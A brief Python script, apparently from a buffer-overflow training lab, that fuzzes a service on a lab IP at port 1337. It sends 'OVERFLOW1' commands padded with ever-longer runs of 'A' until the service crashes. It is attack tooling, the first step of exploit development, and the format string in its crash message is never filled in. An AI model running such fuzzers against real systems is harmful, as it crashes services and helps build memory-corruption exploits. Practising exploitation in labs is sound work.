import socket, time, sys
from time import sleep

ip = "10.10.32.123"
port = 1337
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send(bytes("OVERFLOW1 " + string + "\r\n"))
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + " crashed at {} bytes.")
        sys.exit(0)
    time.sleep(1)
